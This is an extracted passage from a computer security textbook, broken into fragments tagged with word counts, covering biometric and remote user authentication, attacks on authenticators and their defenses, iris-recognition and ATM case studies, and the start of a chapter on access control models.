of biometric accuracy, we need to have a general idea of how biometric ­systems work.
[Word Count: 94]

Operation of a Biometric Authentication System
[Word Count: 6]

Depending on application, user authentication on a biometric system involves 
either verification or identification. Verification is analogous to a user logging on 
to a system by using a memory card or smart card coupled with a password or PIN. 
For biometric verification, the user enters a PIN and also uses a ­biometric sensor. 
The system extracts the corresponding feature and compares that to the template 
stored for this user. If there is a match, then the system authenticates this user.
[Word Count: 80]

For an identification system, the individual uses the biometric sensor but 
­presents no additional information. The system then compares the presented 
­template with the set of stored templates. If there is a match, then this user is 
­identified. Otherwise, the user is rejected.
[Word Count: 43]

Figure 3.7    Cost versus Accuracy of Various Biometric 
Characteristics in User Authentication Schemes
[Word Count: 13]

User’s identity or
“user unidentiﬁed”
N templates
[Word Count: 7]

Figure 3.8    A Generic Biometric System    Enrollment creates an associa-
tion between a user and the user’s biometric characteristics. Depending on the 
­application, user authentication either involves verifying that a claimed user  
is­ the actual user or identifying an unknown user.
[Word Count: 41]

For a given biometric scheme, we can plot the false match versus false nonmatch 
rate, called the operating characteristic curve. Figure 3.10 shows idealized curves for 
two different systems. The curve that is lower and to the left performs better. The 
dot on the curve corresponds to a specific threshold for biometric testing. Shifting the 
threshold along the curve up and to the left provides greater security and the cost of 
decreased convenience. The inconvenience comes from a valid user being denied access
[Word Count: 83]

Figure 3.9    Profiles of a Biometric Characteristic of an Imposter and an 
Authorized User    In this depiction, the comparison between the ­presented 
feature and a reference feature is reduced to a single numeric value. If the 
input value (s) is greater than a preassigned ­threshold (t), a match is declared.
[Word Count: 50]

and being required to take further steps. A plausible tradeoff is to pick a threshold that 
corresponds to a point on the curve where the rates are equal. A high-security applica-
tion may require a very low false match rate, resulting in a point farther to the left on the 
curve. For a forensic application, in which the system is looking for possible candidates, 
to be checked further, the requirement may be for a low false nonmatch rate.
[Word Count: 78]

Figure 3.11 shows characteristic curves developed from actual product testing. 
The iris system had no false matches in over 2 million cross-comparisons. Note that 
over a broad range of false match rates, the face biometric is the worst performer.
[Word Count: 39]

The simplest form of user authentication is local authentication, in which a user 
­attempts to access a system that is locally present, such as a stand-alone office PC or 
an ATM machine. The more complex case is that of remote user authentication,
[Word Count: 42]

Increased
security,
decreased 
convenience
[Word Count: 4]

Decreased
security,
increased
convenience
[Word Count: 4]

Figure 3.10    Idealized Biometric Measurement Operating Characteristic Curves 
(log-log scale)
[Word Count: 10]

which takes place over the Internet, a network, or a communications link. Remote 
user authentication raises additional security threats, such as an eavesdropper being 
able to capture a password, or an adversary replaying an authentication sequence 
that has been observed.
[Word Count: 40]

To counter threats to remote user authentication, systems generally rely on some 
form of challenge-response protocol. In this section, we present the basic elements of 
such protocols for each of the types of authenticators discussed in this chapter.
[Word Count: 38]

The host stores the hash function of each registered user’s password, depicted 
as h(P(U)) for user U. When the response arrives, the host compares the ­incoming 
f(r′, h(P′)) to the calculated f(r, h(P(U))). If the quantities match, the user is 
­authenticated.
[Word Count: 41]

This scheme defends against several forms of attack. The host stores not the pass-
word but a hash code of the password. As discussed in Section 3.2, this secures the 
password from intruders into the host system. In addition, not even the hash of the 
password is transmitted directly, but rather a function in which the password hash is 
one of the arguments. Thus, for a suitable function f, the password hash cannot be cap-
tured during transmission. Finally, the use of a random number as one of the arguments
[Word Count: 90]

Figure 3.11    Actual Biometric Measurement Operating Characteristic 
Curves, Reported in [MANSO1]    To clarify differences among ­systems, 
a log-log scale is used.
[Word Count: 21]

of f defends against a replay attack, in which an adversary captures the user’s transmis-
sion and attempts to log on to a system by retransmitting the user’s messages.
[Word Count: 29]

Figure 3.12b provides a simple example of a token protocol for authentication. 
As before, a user first transmits his or her identity to the remote host. The host 
returns a random number and the identifiers of functions f() and h() to be used in the
[Word Count: 45]

extract B’
from (r’, BS’(x’))
if r’ = r AND x’ = x
[Word Count: 13]

P’        W’
password to
passcode via token
[Word Count: 7]

Figure 3.12    Basic Challenge-Response Protocols for Remote User Authentication
Source: Based on [OGOR03].
[Word Count: 13]

3.6	 Security Issues for User Authentication
[Word Count: 6]

As with any security service, user authentication, particularly remote user authen-
tication, is subject to a variety of attacks. Table 3.4, from [OGOR03], summarizes 
the principal attacks on user authentication, broken down by type of authenticator. 
Much of the table is self-explanatory. In this section, we expand on some of the 
table’s entries.
[Word Count: 53]

3.6 / Security Issues for User Authentication   103
[Word Count: 8]

Client attacks are those in which an adversary attempts to achieve user 
­authentication without access to the remote host or to the intervening communica-
tions path. The adversary attempts to masquerade as a legitimate user. For a pass-
word-based system, the adversary may attempt to guess the likely user password. 
Multiple guesses may be made. At the extreme, the adversary sequences through 
all possible passwords in an exhaustive attempt to succeed. One way to thwart such 
an attack is to select a password that is both lengthy and unpredictable. In effect,
[Word Count: 91]

Table 3.4    Some Potential Attacks, Susceptible Authenticators, and Typical Defenses
[Word Count: 10]

Attacks 
Authenticators 
Examples 
Typical Defenses
[Word Count: 5]

Token 
Exhaustive search 
Large entropy; limited attempts;
[Word Count: 7]

Biometric 
False match 
Large entropy; limited
[Word Count: 6]

Password 
Plaintext theft,  
dictionary/exhaustive
[Word Count: 4]

Token 
Passcode theft 
Same as password; 1-time
[Word Count: 7]

Biometric 
Template theft 
Capture device authentication;
[Word Count: 6]

Password 
“Shoulder surfing” 
User diligence to keep secret; 
­administrator diligence to quickly
[Word Count: 12]

Copy detection at capture 
device and capture device
[Word Count: 8]

Copy detection at capture 
device and capture device 
­authentication via challenge-
[Word Count: 11]

Installation of rogue  
client or capture device
[Word Count: 7]

Authentication of client or  
capture device within trusted
[Word Count: 8]

Lockout by multiple  
failed authentications
[Word Count: 5]

such a password has large entropy; that is, many bits are required to represent the 
password. Another countermeasure is to limit the number of attempts that can be 
made in a given time period from a given source.
[Word Count: 38]

A token can generate a high-entropy passcode from a low-entropy PIN or pass-
word, thwarting exhaustive searches. The adversary may be able to guess or acquire 
the PIN or password but must additionally acquire the physical token to succeed.
[Word Count: 39]

Host attacks are directed at the user file at the host where passwords, token 
passcodes, or biometric templates are stored. Section 3.2 discusses the security 
considerations with respect to passwords. For tokens, there is the additional 
­defense of using one-time passcodes, so that passcodes are not stored in a host 
passcode file. Biometric features of a user are difficult to secure because they are 
physical features of the user. For a static feature, biometric device authentica-
tion adds a measure of protection. For a dynamic feature, a challenge-response 
­protocol enhances security.
[Word Count: 91]

Replay attacks involve an adversary repeating a previously captured 
user ­response. The most common countermeasure to such attacks is the challenge-­
response protocol.
[Word Count: 23]

In a Trojan horse attack, an application or physical device masquerades as 
an authentic application or device for the purpose of capturing a user password, 
passcode, or biometric. The adversary can then use the captured information to 
masquerade as a legitimate user. A simple example of this is a rogue bank ­machine 
used to capture user ID/password combinations.
[Word Count: 58]

A denial-of-service attack attempts to disable a user authentication service by 
flooding the service with numerous authentication attempts. A more selective attack 
denies service to a specific user by attempting logon until the threshold is reached 
that causes lockout to this user because of too many logon attempts. A multifac-
tor authentication protocol that includes a token thwarts this attack, because the 
­adversary must first acquire the token.
[Word Count: 68]

3.7	 Practical Application: An Iris Biometric System
[Word Count: 7]

As an example of a biometric user authentication system, we look at an iris bio-
metric system that was developed for use by the United Arab Emirates (UAE) at 
border control points [DAUG04, TIRO05, NBSP08]. The UAE relies heavily on an 
outside workforce, and has increasingly become a tourist attraction. Accordingly,
[Word Count: 51]

3.7 / Practical Application: An Iris Biometric System   105
[Word Count: 9]

To counter such attempts, the UAE decided on using a biometric identifica-
tion system and identified the following requirements:
[Word Count: 19]

• Identify a single person from a large population of people
 
• Rely on a biometric feature that does not change over time
 
• Use biometric features that can be acquired quickly
 
• Be easy to use
 
• Respond in real-time for mass transit applications
 
• Be safe and non-invasive
 
• Scale into the billions of comparisons and maintain top performance
 
• Be affordable
[Word Count: 64]

And chose iris recognition as the most efficient and foolproof method. No two irises 
are alike. There is no correlation between the iris patterns of even identical twins, or 
the right and left eye of an individual.
[Word Count: 37]

Note that this is computationally a more demanding task than verifying an 
identity. In this case, the iris pattern of each incoming passenger is compared against 
the entire database of known patterns to determine if there is a match. Given the 
current volume of traffic and size of the database, the daily number of iris cross-
comparisons is well over 9 billion.
[Word Count: 62]

As with any security system, adversaries are always looking for countermeas-
ures. UAE officials had to adopt new security methods to detect if an iris has been 
dilated with eye drops before scanning. Expatriates who were banned from the
[Word Count: 39]

3.8 / Case Study: Security Problems for Atm Systems   107
[Word Count: 10]

UAE started using eye drops in an effort to fool the government’s iris recognition 
system when they try to re-enter the country. A new algorithm and computerized 
step-by-step procedure has been adopted to help officials determine if an iris is in 
normal condition or an eye-dilating drop has been used.
[Word Count: 50]

	 3.8	 Case Study: Security Problems
	 	
for Atm Systems
[Word Count: 9]

Redspin, Inc., an independent auditor, recently released a report describing a 
­security vulnerability in ATM (automated teller machine) usage that ­affects a 
­number of small to mid-size ATM card issuers. This vulnerability provides a ­useful 
case study ­illustrating that cryptographic functions and services alone do not 
­guarantee security; they must be properly implemented as part of a system.
[Word Count: 58]

We begin by defining terms used in this section:
[Word Count: 9]

•	 Cardholder:  An individual to whom a debit card is issued. Typically, this
[Word Count: 13]

­individual is also responsible for payment of all charges made to that card.
[Word Count: 13]

Figure 3.13  General Iris Scan Site Architecture for UAE System
[Word Count: 10]

•	 Issuer:  An institution that issues debit cards to cardholders. This institution
[Word Count: 12]

is responsible for the cardholder’s account and authorizes all transactions. 
Banks and credit unions are typical issuers.
	
•	 Processor:  An organization that provides services such as core data processing
[Word Count: 29]

(PIN recognition and account updating), electronic funds transfer (EFT), and so 
on to issuers. EFT allows an issuer to access regional and national networks that 
connect point of sale (POS) devices and ATMs worldwide. Examples of process-
ing ­companies include Fidelity National Financial and Jack Henry & Associates.
[Word Count: 48]

Customers expect 24/7 service at ATM stations. For many small to mid-sized 
issuers, it is more cost-effective for contract processors to provide the required data 
processing and EFT/ATM services. Each service typically requires a dedicated data 
connection between the issuer and the processor, using a leased line or a virtual 
leased line.
[Word Count: 52]

Prior to about 2003, the typical configuration involving issuer, processor, 
and ATM machines could be characterized by Figure 3.14a. The ATM  units linked 
directly to the processor rather than to the issuer that owned the ATM, via leased 
or virtual leased line. The use of a dedicated link made it difficult to maliciously
[Word Count: 53]

(a) Point-to-point connection to processor
[Word Count: 5]

EFT exchange
e.g., Star, VISA
Issuer's
internal network
[Word Count: 8]

Figure 3.14    ATM Architectures    Most small to mid-sized issuers of debit cards con-
tract processors to provide core data processing and electronic funds transfer (EFT) 
services. The bank’s ATM machine may link directly to the processor or to the bank.
[Word Count: 40]

intercept transferred data. To add to the security, the PIN portion of messages  
transmitted from ATM to processor was encrypted using DES (Data Encryption 
Standard). Processors have connections to EFT (electronic funds transfer) exchange 
networks to allow cardholders ­access to accounts from any ATM. With the configu-
ration of Figure 3.14a, a transaction proceeds as follows. A user swipes her card and 
enters her PIN. The ATM ­encrypts the PIN and transmits it to the processor as part 
of an ­authorization request. The processor updates the customer’s information and 
sends a reply.
[Word Count: 92]

Because issuers typically run their own Internet-connected local area ­networks 
(LANs) and intranets using TCP/IP, it was attractive to connect ATMs to these 
issuer networks and maintain only a single dedicated line to the processor, leading 
to the configuration illustrated in Figure 3.14b. This configuration saves the issuer 
expensive monthly circuit fees and enables easier management of ATMs by the 
issuer. In this configuration, the information sent from the ATM to the processor 
traverses the ­issuer’s network before being sent to the processor. It is during this 
time on the issuer’s network that the customer information is ­vulnerable.
[Word Count: 98]

The security problem was that with the upgrade to a new ATM OS and a 
new communications configuration, the only security enhancement was the use of 
triple DES rather than DES to encrypt the PIN. The rest of the information in the 
ATM request message is sent in the clear. This ­includes the card number, expiration 
date, account balances, and withdrawal amounts. A hacker tapping into the bank’s 
­network, either from an internal location or from across the Internet potentially 
would have complete access to every single ATM transaction.
[Word Count: 89]

The situation just described leads to two principal vulnerabilities:
[Word Count: 9]

•	 Confidentiality: The card number, expiration date, and account balance can
[Word Count: 11]

be used for online purchases or to create a duplicate card for signature-based 
transactions.
[Word Count: 14]

•	 Integrity: There is no protection to prevent an attacker from injecting or
[Word Count: 13]

altering data in transit. If an adversary is able to capture messages en route, 
the adversary can masquerade as either the processor or the ATM. Acting 
as the processor, the adversary may be able to ­direct the ATM to dispense 
money without the processor ever knowing that a transaction has occurred. 
If an adversary captures a user’s account information and ­encrypted PIN, 
the account is compromised until the ATM encryption key is changed, 
­enabling the adversary to modify account balances or effect transfers.
[Word Count: 83]

Redspin recommended a number of measures that banks can take to counter 
these threats. Short-term fixes include segmenting ATM traffic from the rest of the
[Word Count: 25]

3.8 / Case Study: Security Problems for Atm Systems   109
[Word Count: 10]

network either by implementing strict firewall rule sets or physically dividing the 
networks altogether. An additional short-term fix is to implement network-level 
­encryption between routers that the ATM traffic traverses.
[Word Count: 30]

Long-term fixes involve changes in the application-level software. Protecting 
confidentiality requires encrypting all customer-related information that traverses the 
network. Ensuring data integrity requires better machine-to-machine authentication 
between the ATM and processor and the use of challenge-response protocols to coun-
ter replay attacks.
[Word Count: 42]

[OGOR03] is the paper to read for an authoritative survey of the topics of this chapter. 
[BURR13] is also a worthwhile survey. [SCAR09] is a comprehensive look at many issues 
related to password selection and management.
[Word Count: 36]

BURR13    Burr, W, et al. Electronic Authentication Guideline. Gaithersburg, MD:
[Word Count: 10]

National Institute of Standards and Technology, Special Publication  
800–63–2, August 2013.
OGOR03   O’Gorman, L. “Comparing Passwords, Tokens and Biometrics for User
[Word Count: 21]

­Authentication.” Proceedings of the IEEE, December 2003.
SCAR09a  Scarfone, K., and Souppaya, M. Guide to Enterprise Password Management
[Word Count: 18]

(Draft). NIST Special Publication SP 800-118 (Draft), April 2009.
[Word Count: 9]

3.1	
In general terms, what are four means of authenticating a user’s identity?
	 3.2	
List and briefly describe the principal threats to the secrecy of passwords.
	 3.3	
What are two common techniques used to protect a password file?
[Word Count: 38]

biometric
challenge-response protocol
claimant
credential
credential service provider
[Word Count: 8]

(CSP)
dynamic biometric
enroll
hashed password
[Word Count: 6]

identification
memory card
nonce
password
rainbow table
registration authority (RA)
relying party (RP)
salt
shadow password file
[Word Count: 17]

smart card
static biometric
subscriber
token
user authentication
verification
verifier
[Word Count: 10]

3.10  Key Terms, Review Questions, and Problems
[Word Count: 7]

3.10 / Key Terms, Review Questions, and Problems   111
[Word Count: 9]

3.4	
List and briefly describe four common techniques for selecting or assigning passwords.
	 3.5	
Explain the difference between a simple memory card and a smart card.
	 3.6	
List and briefly describe the principal physical characteristics used for biometric 
identification.
	 3.7	
In the context of biometric user authentication, explain the terms, enrollment, verifi-
cation, and identification.
	 3.8	
Define the terms false match rate and false nonmatch rate, and explain the use of a 
threshold in relationship to these two rates.
	 3.9	
Describe the general concept of a challenge-response protocol.
[Word Count: 88]

what is the expected time to discover the correct password?
	
b.	 Assuming feedback to the adversary flagging an error as each incorrect character
[Word Count: 23]

is entered, what is the expected time to discover the correct password?
	
3.4	
Assume that source elements of length k are mapped in some uniform fashion into a 
target elements of length p. If each digit can take on one of r values, then the number 
of source elements is rk and the number of target elements is the smaller number rp. 
A particular source element xi is mapped to a particular target element yj.
	
a.	 What is the probability that the correct source element can be selected by an
[Word Count: 90]

­adversary on one try?
	
b.	 What is the probability that a different source element xk (xi ≠xk) that results in
[Word Count: 20]

the same target element, yj, could be produced by an adversary?
	
c.	 What is the probability that the correct target element can be produced by an
[Word Count: 26]

b.	 Show that the probability that an input word, not in the dictionary, will be falsely
[Word Count: 16]

c.	 Show that the preceding expression can be approximated as
[Word Count: 10]

3.11	
For the biometric authentication protocols illustrated in Figure 3.12, note that the 
biometric capture device is authenticated in the case of a static biometric but not 
­authenticated for a dynamic biometric. Explain why authentication is useful in the 
case of a stable biometric but not needed in the case of a dynamic biometric.
	 3.12	
A relatively new authentication proposal is the Secure Quick Reliable Login (SQRL) 
described here: https://www.grc.com/sqrl/sqrl.htm. Write a brief summary of how 
SQRL works and indicate how it fits into the categories of types of user authentica-
tion listed in this chapter.
[Word Count: 96]

Access Control Context
Access Control Policies
[Word Count: 6]

4.2	
Subjects, Objects, and Access Rights
[Word Count: 6]

An Access Control Model
Protection Domains
[Word Count: 6]

Traditional UNIX File Access Control
Access Control Lists in UNIX
[Word Count: 10]

Attributes
ABAC Logical Architecture
ABAC Policies
[Word Count: 6]

4.7	
Identity, Credential, and Access Management
[Word Count: 6]

Identity Management
Credential Management
Access Management
Identity Federation
[Word Count: 8]

Traditional Identity Exchange Approach
Open Identity Trust Framework
[Word Count: 8]

4.11	 Key Terms, Review Questions, and Problems
[Word Count: 7]

Two definitions of access control are useful in understanding its scope.
[Word Count: 11]

1.	 NIST IR 7298, Glossary of Key Information Security Terms, defines access
[Word Count: 12]

control as the process of granting or denying specific requests to: (1) obtain 
and use information and related information processing services; and (2) enter 
specific physical facilities.
	
2.	 RFC 4949, Internet Security Glossary, defines access control as a process by
[Word Count: 40]

which use of system resources is regulated according to a security policy and 
is permitted only by authorized entities (users, programs, processes, or other 
systems) according to that policy.
[Word Count: 29]

We can view access control as the central element of computer security. The 
principal objectives of computer security are to prevent unauthorized users from 
gaining access to resources, to prevent legitimate users from accessing resources in 
an unauthorized manner, and to enable legitimate users to access resources in an 
­authorized manner.
[Word Count: 51]

We begin this chapter with an overview of some important concepts. Next we 
look at three widely used techniques for implementing access control policies. We then 
turn to a broader perspective of the overall management of access control using iden-
tity, credentials, and attributes. Finally, the concept of a trust framework is introduced.
[Word Count: 53]

In a broad sense, all of computer security is concerned with access control. Indeed, 
RFC 4949 defines computer security as follows: Measures that implement and ­assure 
security services in a computer system, particularly those that assure access control 
service. This chapter deals with a narrower, more specific concept of access control: 
Access control implements a security policy that specifies who or what (e.g., in the 
case of a process) may have access to each specific system resource and the type of 
access that is permitted in each instance.
[Word Count: 88]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	 explain how access control fits into the broader context that includes
[Word Count: 12]

­authentication, authorization, and audit.
◆	 define the three major categories of access control policies.
◆	 distinguish among subjects, objects, and access rights.
◆	 Describe the UNIX file access control model.
◆	 Discuss the principal concepts of role-based access control.
◆	 Summarize the RBAC model.
◆	 Discuss the principal concepts of attribute-based access control.
◆	 Explain the identity, credential, and access management model.
◆	 Understand the concept of identity federation and its relationship to a trust
[Word Count: 75]

Figure 4.1 shows a broader context of access control. In addition to access control, 
this context involves the following entities and functions:
[Word Count: 22]

• Authentication:  Verification that the credentials of a user or other system
[Word Count: 12]

­entity are valid.
	
• Authorization:  The granting of a right or permission to a system entity to
[Word Count: 17]

­access a system resource. This function determines who is trusted for a given 
purpose.
	
• Audit:  An independent review and examination of system records and
[Word Count: 25]

­activities in order to test for adequacy of system controls, to ensure compli-
ance with ­established policy and operational procedures, to detect breaches 
in security, and to recommend any indicated changes in control, policy and 
procedures.
[Word Count: 36]

An access control mechanism mediates between a user (or a process executing 
on behalf of a user) and system resources, such as applications, operating systems, 
firewalls, routers, files, and databases. The system must first authenticate an entity 
seeking access. Typically, the authentication function determines whether the user
[Word Count: 47]

Figure 4.1    Relationship Among Access Control and Other Security Functions
Source: Based on [SAND94].
[Word Count: 14]

is permitted to ­access the system at all. Then the access control function determines 
if the specific requested access by this user is permitted. A security administrator 
maintains an authorization database that specifies what type of access to which 
­resources is allowed for this user. The access control function consults this database 
to determine whether to grant access. An auditing function monitors and keeps a 
record of user accesses to system resources.
[Word Count: 72]

In the simple model of Figure 4.1, the access control function is shown as a 
­single logical module. In practice, a number of components may cooperatively share 
the access control function. All operating systems have at least a rudimentary, and in 
many cases a quite robust, access control component. Add-on ­security packages can 
supplement the native access control capabilities of the operating system. Particular 
­applications or ­utilities, such as a database management system, also incorporate 
­access ­control functions. External devices, such as firewalls, can also provide ­access 
control ­services.
[Word Count: 89]

An access control policy, which can be embodied in an authorization database, 
­dictates what types of access are permitted, under what circumstances, and by 
whom. Access control policies are generally grouped into the following categories:
[Word Count: 35]

• Discretionary access control (DAC):  Controls access based on the identity
[Word Count: 11]

of the requestor and on access rules (authorizations) stating what ­requestors 
are (or are not) allowed to do. This policy is termed discretionary because an 
entity might have access rights that permit the entity, by its own ­volition, to 
enable another entity to access some resource.
	
• Mandatory access control (MAC):  Controls access based on comparing
[Word Count: 56]

­security labels (which indicate how sensitive or critical system resources are) 
with security clearances (which indicate system entities are eligible to ­access 
certain resources). This policy is termed mandatory because an entity that has 
clearance to access a resource may not, just by its own volition, enable another 
entity to access that resource.
	
• Role-based access control (RBAC):  Controls access based on the roles that
[Word Count: 65]

users have within the system and on rules stating what accesses are allowed to 
users in given roles.
	
• Attribute-based access control (ABAC):  Controls access based on attri-
[Word Count: 28]

butes of the user, the resource to be accessed, and current environmental 
conditions.
[Word Count: 13]

DAC is the traditional method of implementing access control, and is exam-
ined in Sections 4.3 and 4.4. MAC is a concept that evolved out of requirements for 
military information security and is best covered in the context of trusted systems, 
which we deal with in Chapter 13. Both RBAC and ABAC have become increas-
ingly popular, and are examined in Sections 4.5 and 4.6, respectively.
[Word Count: 66]

These four policies are not mutually exclusive. An access control mechanism 
can employ two or even all three of these policies to cover different classes of system 
resources.
[Word Count: 28]

4.2 / Subjects, Objects, and Access Rights   117
[Word Count: 8]

4.2	 Subjects, Objects, and Access Rights
[Word Count: 6]

The basic elements of access control are: subject, object, and access right.
[Word Count: 12]

A subject is an entity capable of accessing objects. Generally, the concept of 
subject equates with that of process. Any user or application actually gains access to 
an object by means of a process that represents that user or application. The process 
takes on the attributes of the user, such as access rights.
[Word Count: 53]

A subject is typically held accountable for the actions they have initiated, 
and an audit trail may be used to record the association of a subject with security-
relevant actions performed on an object by the subject.
[Word Count: 37]

Basic access control systems typically define three classes of subject, with 
­different access rights for each class:
[Word Count: 17]

• Owner:  This may be the creator of a resource, such as a file. For system ­resources,
[Word Count: 17]

ownership may belong to a system administrator. For project ­resources, a project 
administrator or leader may be assigned ownership.
	
• Group:  In addition to the privileges assigned to an owner, a named group of
[Word Count: 34]

users may also be granted access rights, such that membership in the group is 
sufficient to exercise these access rights. In most schemes, a user may belong 
to multiple groups.
	
• World:  The least amount of access is granted to users who are able to access
[Word Count: 46]

the system but are not included in the categories owner and group for this 
resource.
[Word Count: 15]

An object is a resource to which access is controlled. In general, an object 
is an entity used to contain and/or receive information. Examples include records, 
blocks, pages, segments, files, portions of files, directories, directory trees, mail-
boxes, messages, and programs. Some access control systems also encompass, bits, 
bytes, words, processors, communication ports, clocks, and network nodes.
[Word Count: 57]

The number and types of objects to be protected by an access control ­system 
depends on the environment in which access control operates and the desired 
­tradeoff between security on the one hand and complexity, processing burden, and 
ease of use on the other hand.
[Word Count: 45]

An access right describes the way in which a subject may access an object. 
­Access rights could include the following:
[Word Count: 20]

• Read:  User may view information in a system resource (e.g., a file, selected
[Word Count: 14]

records in a file, selected fields within a record, or some combination). Read 
access includes the ability to copy or print.
[Word Count: 21]

• Write:  User may add, modify, or delete data in system resource (e.g., files,
[Word Count: 14]

records, programs). Write access includes read access.
[Word Count: 7]

• Execute:  User may execute specified programs.
[Word Count: 7]

• Delete:  User may delete certain system resources, such as files or records.
[Word Count: 13]

• Create:  User may create new files, records, or fields.
[Word Count: 10]

• Search:  User may list the files in a directory or otherwise search the ­directory.
[Word Count: 15]

As was previously stated, a discretionary access control scheme is one in which an 
­entity may be granted access rights that permit the entity, by its own volition, to 
­enable another entity to access some resource. A general approach to DAC, as 
exercised by an operating system or a database management system, is that of an 
access matrix. The access matrix concept was formulated by Lampson [LAMP69, 
LAMP71], and subsequently refined by Graham and Denning [GRAH72, DENN71] 
and by Harrison et al. [HARR76].
[Word Count: 83]

Figure 4.2a, based on a figure in [SAND94], is a simple example of an access 
matrix. Thus, user A owns files 1 and 3 and has read and write access rights to those 
files. User B has read access rights to file 1, and so on.
[Word Count: 46]

When it is desired to determine which subjects have which access rights to a par-
ticular resource, ACLs are convenient, because each ACL provides the ­information 
for a given resource. However, this data structure is not convenient for ­determining 
the access rights available to a specific user.
[Word Count: 47]

4.3 / Discretionary Access Control   119
[Word Count: 6]

(b) Access control lists for ﬁles of part (a)
[Word Count: 9]

(c) Capability lists for ﬁles of part (a)
[Word Count: 8]

The convenient and inconvenient aspects of capability tickets are the opposite 
of those for ACLs. It is easy to determine the set of access rights that a given user 
has, but more difficult to determine the list of users with specific access rights for a 
specific resource.
[Word Count: 47]

[SAND94] proposes a data structure that is not sparse, like the access matrix, 
but is more convenient than either ACLs or capability lists (Table 4.1). An autho-
rization table contains one row for one access right of one subject to one resource. 
Sorting or accessing the table by subject is equivalent to a capability list. Sorting or 
accessing the table by object is equivalent to an ACL. A relational database can 
­easily implement an authorization table of this type.
[Word Count: 79]

Figure 4.2    Example of Access Control Structures
[Word Count: 7]

To represent the protection state, we extend the universe of objects in the 
­access control matrix to include the following:
[Word Count: 20]

• Processes:  Access rights include the ability to delete a process, stop (block),
[Word Count: 13]

and wake up a process.
	
• Devices:  Access rights include the ability to read/write the device, to control
[Word Count: 18]

its operation (e.g., a disk seek), and to block/unblock the device for use.
	
• Memory locations or regions:  Access rights include the ability to read/write
[Word Count: 25]

certain regions of memory that are protected such that the default is to ­disallow 
access.
[Word Count: 15]

Table 4.1    Authorization Table for Files in Figure 4.2
[Word Count: 9]

4.3 / Discretionary Access Control   121
[Word Count: 6]

• Subjects:  Access rights with respect to a subject have to do with the ability to grant
[Word Count: 17]

or delete access rights of that subject to other objects, as explained ­subsequently.
[Word Count: 13]

Figure 4.3 is an example. For an access control matrix A, each entry A[S, X] con-
tains strings, called access attributes, that specify the access rights of subject S to object 
X. For example, in Figure 4.3, S1 may read file F1, because ‘read’ appears in A[S1, F1].
[Word Count: 48]

From a logical or functional point of view, a separate access control module is 
associated with each type of object (Figure 4.4). The module evaluates each request 
by a subject to access an object to determine if the access right exists. An access 
­attempt triggers the following steps:
[Word Count: 48]

1.	 A subject S0 issues a request of type α for object X.
	
2.	 The request causes the system (the operating system or an access control inter-
[Word Count: 27]

face module of some sort) to generate a message of the form (S0, α, X) to the 
­controller for X.
	
3.	 The controller interrogates the access matrix A to determine if α is in A[S0, X].
[Word Count: 36]

If so, the access is allowed; if not, the access is denied and a protection viola-
tion occurs. The violation should trigger a warning and appropriate action.
[Word Count: 27]

Figure 4.4 suggests that every access by a subject to an object is mediated 
by the controller for that object, and that the controller’s decision is based on the 
­current contents of the matrix. In addition, certain subjects have the authority to 
make specific changes to the access matrix. A request to modify the access matrix is 
treated as an ­access to the matrix, with the individual entries in the matrix ­treated as 
objects. Such accesses are mediated by an access matrix controller, which controls 
updates to the matrix.
[Word Count: 89]

The model also includes a set of rules that govern modifications to the access 
matrix, shown in Table 4.2. For this purpose, we introduce the access rights ‘owner’ 
and ‘control’ and the concept of a copy flag, explained in the subsequent paragraphs.
[Word Count: 42]

The first three rules deal with transferring, granting, and deleting access rights. 
Suppose that the entry α* exists in A[S0, X]. This means that S0 has access right α to
[Word Count: 30]

Figure 4.3    Extended Access Control Matrix
[Word Count: 6]

The remaining rules in Table 4.2 govern the creation and deletion of subjects 
and objects. Rule R5 states that any subject can create a new object, which it owns, 
and can then grant and delete access to the object. Under Rule R6, the owner of 
an object can destroy the object, resulting in the deletion of the corresponding
[Word Count: 58]

delete b from Sp, Y
(Sm, delete, b, Sp, Y)
[Word Count: 10]

Figure 4.4    An Organization of the Access Control Function
[Word Count: 9]

4.3 / Discretionary Access Control   123
[Word Count: 6]

Table 4.2    Access Control System Commands
[Word Count: 6]

Rule 
Command (by S0) 
Authorization 
Operation
[Word Count: 6]

R3 
delete α from S, X 
or 
delete α from A[S, X]
[Word Count: 12]

R4 
w d read S, X 
or 
copy A[S, X] into w
[Word Count: 12]

R5 
create object X 
None 
add column for X to A; store 
‘owner’ in A[S0, X]
[Word Count: 16]

R6 
destroy object X 
‘owner’ in A[S0, X] 
delete column for X from A
[Word Count: 14]

R7 
create subject S 
none 
add row for S to A; ­execute 
create object S; store 
­‘control’ in A[S, S]
[Word Count: 20]

R8 
destroy subject S 
‘owner’ in A[S0, S] 
delete row for S from A; 
­execute destroy object S
[Word Count: 18]

­column of the access matrix. Rule R7 enables any subject to create a new subject; 
the ­creator owns the new subject and the new subject has control ­access to itself. 
Rule R8 ­permits the owner of a subject to delete the row and ­column (if there are 
subject columns) of the access matrix designated by that ­subject.
[Word Count: 57]

The set of rules in Table 4.2 is an example of the rule set that could be defined 
for an access control system. The following are examples of additional or alternative 
rules that could be included. A transfer-only right could be defined, which results in the 
transferred right being added to the target subject and deleted from the transferring 
subject. The number of owners of an object or a subject could be limited to one by 
not allowing the copy flag to accompany the owner right.
[Word Count: 86]

The access control matrix model that we have discussed so far associates a set of 
­capabilities with a user. A more general and more flexible approach, proposed
[Word Count: 27]

in [LAMP71], is to associate capabilities with protection domains. A protection 
­domain is a set of objects together with access rights to those objects. In terms 
of the access ­matrix, a row defines a protection domain. So far, we have equated 
each row with a specific user. So, in this limited model, each user has a protection 
­domain, and any processes spawned by the user have access rights defined by the 
same protection domain.
[Word Count: 74]

A more general concept of protection domain provides more flexibility. For 
example, a user can spawn processes with a subset of the access rights of the user, 
defined as a new protection domain. This limits the capability of the process. Such a 
scheme could be used by a server process to spawn processes for different classes of 
users. Also, a user could define a protection domain for a program that is not fully 
trusted, so that its access is limited to a safe subset of the user’s access rights.
[Word Count: 89]

The association between a process and a domain can be static or dynamic. 
For example, a process may execute a sequence of procedures and require differ-
ent ­access rights for each procedure, such as read file and write file. In general, 
we would like to minimize the access rights that any user or process has at any 
one time; the use of protection domains provides a simple means to satisfy this 
­requirement.
[Word Count: 72]

One form of protection domain has to do with the distinction made in many 
operating systems, such as UNIX, between user and kernel mode. A user program 
executes in a user mode, in which certain areas of memory are protected from the 
user’s use and in which certain instructions may not be executed. When the user 
process calls a system routine, that routine executes in a system mode, or what has 
come to be called kernel mode, in which privileged instructions may be executed 
and in which protected areas of memory may be accessed.
[Word Count: 94]

For our discussion of UNIX file access control, we first introduce several basic 
­concepts concerning UNIX files and directories.
